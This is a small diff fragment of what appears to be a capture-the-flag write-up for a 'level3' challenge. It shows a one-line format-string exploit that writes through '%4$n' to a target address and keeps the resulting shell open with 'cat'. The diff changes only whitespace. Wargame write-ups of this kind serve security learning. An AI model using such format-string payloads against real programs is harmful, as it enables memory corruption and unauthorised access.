@@ -10,4 +10,3 @@ We know that the fourth arg on the stack is the buffer we wrote, so if we wrtie 
 
 
 (python -c 'print "\x8c\x98\x04\x08"+ "x"*60 + "%4$n"' && cat) | ./level3
-
